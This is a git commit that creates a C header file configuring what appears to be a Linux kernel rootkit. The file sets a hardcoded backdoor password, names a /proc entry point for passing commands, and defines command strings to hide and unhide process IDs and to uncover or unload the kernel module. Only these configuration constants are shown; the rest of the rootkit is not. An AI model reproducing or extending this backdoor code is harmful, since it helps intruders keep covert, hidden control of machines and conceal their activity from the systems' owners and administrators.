bc517376cc2ad8b21bb56454a2831ff87fcc6c15
mikepicard <mikepicard01@gmail.com>
2016-02-18 16:59:38 -0500

    Create head.h

---
+++ head.h
@@ -0,0 +1,7 @@
+/* this is a config file */
+static char password[] = "stupidpassword"; //set the backdoor password
+static char passwaiter[] = "version"; //entry point to pass commands to in /proc
+static char module_release[] = "release"; //release module to unload from kernel
+static char module_uncover[] = "uncover"; //shine some light on what was once dark
+static char hide_proc[] = "hide"; //hide a pid
+static char unhide_proc[] = "unhide"; //unhide a pid
